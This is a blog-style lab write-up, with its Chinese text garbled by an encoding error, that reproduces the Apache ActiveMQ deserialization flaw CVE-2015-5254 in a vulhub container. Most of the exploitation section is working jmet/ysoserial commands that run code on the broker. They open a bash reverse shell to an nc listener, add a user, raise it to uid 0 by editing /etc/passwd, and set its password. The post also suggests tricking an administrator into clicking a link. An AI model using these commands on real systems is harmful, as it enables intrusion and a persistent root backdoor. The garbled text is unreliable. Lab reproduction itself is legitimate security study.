# CVE-2015-5254 ActiveMQ ååºåˆ—åŒ–æ¼æ´ - ç¾å¼åŠ ç³– - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/peace-and-romance/p/15621744.html`](https://www.cnblogs.com/peace-and-romance/p/15621744.html)

### 0X00-å¼•è¨€

* * *

å¬é—»å¹¿é™µä¸çŸ¥å¯’ï¼Œå¤§é›ªé¾™éª‘ä¸‹æ±Ÿå—ã€‚æ€»ç®¡çš„ä¹¦æ²¡è¯è¯´ï¼Œå¥½çš„ä¸è¡Œï¼Œéª—å¾—äº†å‡ æ»´çƒ­æ³ªï¼Œä¹Ÿè¯»å¾—äº†å‡ åˆ†ä»ä¹‰é“å¾·ï¼ŒæŠ€æœ¯æ´»ï¼Œå½“èµï¼

### 0X01-æ¼æ´æè¿°ä¸ç¯å¢ƒæ­å»º

* * *

##### 01-æ¼æ´æè¿°

æ¼æ´ç¼–å·ï¼šCVE-2015-5254

Apache ActiveMQ æ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šæ‰€ç ”å‘çš„ä¸€å¥—å¼€æºçš„æ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå®ƒæ”¯æŒ Java æ¶ˆæ¯æœåŠ¡ï¼Œé›†ç¾¤ï¼ŒSpring Framework ç­‰ã€‚Apache ActiveMQ 5.13.0 ä¹‹å‰ 5.x ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰é™åˆ¶å¯åœ¨ä»£ç†ä¸­åºåˆ—åŒ–çš„ç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–çš„ Java æ¶ˆæ¯æœåŠ¡ï¼ˆJMSï¼‰ObjectMessage å¯¹è±¡åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚

##### 02-ç¯å¢ƒæ­å»º

é¶æœºï¼šCentOS Linux 7

æ”»å‡»æœºï¼šwindows server 2016 && Kail

ç¯å¢ƒï¼švulhub

é¡¹ç›®åœ°å€ï¼š[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

æ­å»º vulhub è¯·è®¿é—®ï¼š[ç©ºç™½ centos7 64 æ­å»º vulhub(è¯¦ç»†)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

ç¯å¢ƒè¿è¡Œåï¼Œå°†ç›‘å¬ 61616 å’Œ 8161 ä¸¤ä¸ªç«¯å£å…¶ä¸­ 61616 æ˜¯å·¥ä½œç«¯å£ï¼Œæ¶ˆæ¯åœ¨è¿™ä¸ªç«¯å£è¿›è¡Œä¼ é€’; 8161 æ˜¯ç½‘ç»œç®¡ç†é¡µé¢ç«¯å£è®¿é—® http://your-ip:8161 å³å¯çœ‹åˆ°ç½‘ç»œç®¡ç†é¡µé¢ï¼Œä¸è¿‡è¿™ä¸ªæ¼æ´ç†è®ºä¸Šæ˜¯ä¸éœ€è¦ç½‘ç»œçš„ã€‚

ä½¿ç”¨æµè§ˆå™¨ç›´æ¥è®¿é—® activemqï¼ŒæŸ¥çœ‹æ˜¯å¦éƒ¨ç½²å®Œæ¯•

[`192.168.234.128:8161/admin/`](http://192.168.234.128:8161/admin/) (é»˜è®¤è´¦å·å¯†ç  admin/admin)

![image-20211129104252697](img/a1334a016f89c14bec4602816e21cea2.png)

### 0X02-æ¼æ´å¤ç°

* * *

##### 01-åˆ©ç”¨è¿‡ç¨‹

**åˆ©ç”¨æµç¨‹ï¼š**

1.  æ„é€ ï¼ˆå¯ä»¥ä½¿ç”¨ ysoserialï¼‰å¯æ‰§è¡Œå‘½ä»¤çš„åºåˆ—åŒ–å¯¹è±¡
2.  ä½œä¸ºä¸€ä¸ªæ¶ˆæ¯ï¼Œå‘é€ç»™ç›®æ ‡ 61616 ç«¯å£
3.  è®¿é—®çš„ Web ç®¡ç†é¡µé¢ï¼Œè¯»å–æ¶ˆæ¯ï¼Œè§¦å‘æ¼æ´

**jmet è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼š**

é¦–å…ˆä¸‹è½½ jmet çš„ jar æ–‡ä»¶ï¼Œå¹¶åœ¨åŒç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª external æ–‡ä»¶å¤¹ï¼ˆå¦åˆ™å¯èƒ½ä¼šçˆ†æ–‡ä»¶å¤¹ä¸å­˜åœ¨çš„é”™è¯¯ï¼‰ã€‚jmet åŸç†æ˜¯ä½¿ç”¨ ysoserial ç”Ÿæˆ Payload å¹¶å‘é€ï¼ˆå…¶ jar å†…è‡ªå¸¦ ysoserialï¼Œæ— éœ€å†è‡ªå·±ä¸‹è½½ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ ysoserial æ˜¯ gadget ä¸­é€‰æ‹©ä¸€ä¸ªå¯ä»¥ä½¿ç”¨çš„ï¼Œæ¯”å¦‚ ROMEã€‚

jmet çš„ GitHub åœ°å€ï¼š

```
https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar 
```

##### 02-åˆ›å»º tmp/success

ä½¿ç”¨ jmet è¿›è¡Œæ”»å‡»

æ‰§è¡Œå‘½ä»¤

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/sucess" -Yp ROME 192.168.234.128 61616 
```

æ‰§è¡Œå‘½ä»¤ä¹‹åä¼šç»™ç›®æ ‡æ·»åŠ ä¸€ä¸ªäº‹ä»¶çš„é˜Ÿåˆ—ï¼ŒæŸ¥çœ‹é˜Ÿåˆ—

[`192.168.234.128:8161/admin/browse.jsp?JMSDestination=event`](http://192.168.234.128:8161/admin/browse.jsp?JMSDestination=event)

![image-20211129105611566](img/675b2078594eb0e638c1a0f3013daff5.png)

ç‚¹å‡» ID è§¦å‘å‘½ä»¤æ‰§è¡Œ

![image-20211129105709311](img/f18d7742865074f1ae5194f51342d8b0.png)

è¿›å…¥é¶æœº docker ä¸­æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œæ˜¯å¦æˆåŠŸ

```
docker exec -it  e8cb4850afc6  /bin/bash 
```

![image-20211129110147732](img/c8725432564ac1da360dfe505ac2a5d0.png)

åˆ›å»ºæˆåŠŸ

![image-20211129110315988](img/cf315ed9bf86084d34bce59ecab49a8c.png)

é€€å‡º docker å‘½ä»¤ exit

![image-20211129110437900](img/fc2ce3336ff2a472310a19d3095b2a14.png)

##### 03-åå¼¹ shell

ç›´æ¥æ‰§è¡Œå‘½ä»¤æ²¡æœ‰åå¼¹æˆåŠŸ

éœ€è¦å°†åå¼¹ shell çš„ä»£ç ååºåˆ—åŒ–

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/192.168.234.128/1234  0>&1" -Yp ROME 192.168.234.128  61616 
```

åŠ å¯†ç½‘å€ï¼š[`www.jackson-t.ca/runtime-exec-payloads.html`](http://www.jackson-t.ca/runtime-exec-payloads.html)

![image-20211129144933561](img/75ef5d9d2351f44ed2c2318c1fa07075.png)

**NetCat å®‰è£…**ï¼š

```
yum -y install nmap-ncat  #å®‰è£…
nc -version  #æŸ¥çœ‹ç‰ˆæœ¬ 
```

nc ç›‘å¬åå¼¹ shell

```
nc -lvvp 1234 
```

å¼€å¯ç›‘å¬åç‚¹å‡»é˜Ÿåˆ—æ¶ˆæ¯ï¼Œç‚¹å‡»ä¹‹åå†è¿”å›é¡µé¢å¯ä»¥æŠŠé˜Ÿåˆ—åˆ é™¤ï¼Œåå¼¹çš„ shell ä¾ç„¶å­˜åœ¨

![image-20211129145347280](img/c515942fc47d6f1b305af9586632cce5.png)

**æˆåŠŸ**![image-20211129145537344](img/7eca8816e6e093094c2b2267380c8527.png)

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé€šè¿‡ web ç®¡ç†é¡µé¢è®¿é—®æ¶ˆæ¯å¹¶è§¦å‘æ¼æ´è¿™ä¸ªè¿‡ç¨‹éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¯±å¯¼ç®¡ç†å‘˜è®¿é—®æˆ‘ä»¬çš„é“¾æ¥ä»¥è§¦å‘ï¼Œæˆ–è€…ä¼ªè£…æˆå…¶ä»–åˆæ³•æœåŠ¡éœ€è¦çš„æ¶ˆæ¯ï¼Œç­‰å¾…å®¢æˆ·ç«¯è®¿é—®çš„æ—¶å€™è§¦å‘ã€‚

##### 04-æ·»åŠ ç”¨æˆ·

æ‰§è¡Œå‘½ä»¤åœ¨ root ç»„å†…æ·»åŠ  test ç”¨æˆ·

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "useradd -g root -s /bin/bash -u 10010 test" -Yp ROME  192.168.234.128  61616 
```

ç‚¹å‡»äº‹ä»¶é˜Ÿåˆ— http://192.168.234.128:8161/admin/browse.jsp?JMSDestination=event

å¯ä»¥åœ¨/etc/passwd ä¸­æŸ¥çœ‹åˆ° test ç”¨æˆ·![image-20211129150900630](img/d0fc1f66eb936d930280fad97d9fe8b8.png)

å°† passwd ä¸­çš„ test çš„ uid ä¿®æ”¹ä¸º 0ï¼Œä½¿å®ƒæ‹¥æœ‰ root æƒé™ï¼Œå†ç‚¹å‡»ä¸€ä¸‹äº‹ä»¶é˜Ÿåˆ—

```
 java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "sed -i "s/test:x:10010/test:x:0/g" /etc/passwd" -Yp ROME  192.168.234.128  61616 
```

ä¿®æ”¹æˆåŠŸ

![image-20211129151303420](img/c60d4d59a5805c79b23b99b9514b3569.png)

å†ä¸º test ç”¨æˆ·è®¾ç½®ä¸€ä¸ªå¯†ç ï¼Œå†ç‚¹å‡»ä¸€æ¬¡æ¶ˆæ¯é˜Ÿåˆ—

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "echo "test:sd123456" | chpasswd" -Yp ROME   192.168.234.128  61616 
```

å„ä½ï¼Œåœ¨è¿™é‡Œï¼Œä¸€ä¸ªåä¸º testï¼Œå¯†ç ä¸º 123456ï¼Œæƒé™ä¸º root çš„ç”¨æˆ·å·²ç»ç”Ÿæˆï¼Œç”¨ SSH ç™»å½•ç³»ç»Ÿï¼Œä¸º root æƒé™ï¼Œæ³¨æ„æ­¤ç”¨æˆ·ä¸º docker å®¹å™¨å†…çš„ç”¨æˆ·ï¼Œä¸ CentOS Linux 7 æ— å…³ï¼Œæ‰€ä»¥è¿æ¥ä¸ä¸ŠğŸ˜

### 0X03-å‚è€ƒæ–‡çŒ®

* * *

[[ActiveMQ ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-5254ï¼‰å¤ç°]](https://www.cnblogs.com/backlion/p/9970516.html)

[ActiveMQ ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-5254ï¼‰](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

[ã€CVEã€‘CVE-2015-5254ï¼šActiveMQ ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨](https://blog.csdn.net/qq_43427482/article/details/114828216?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link)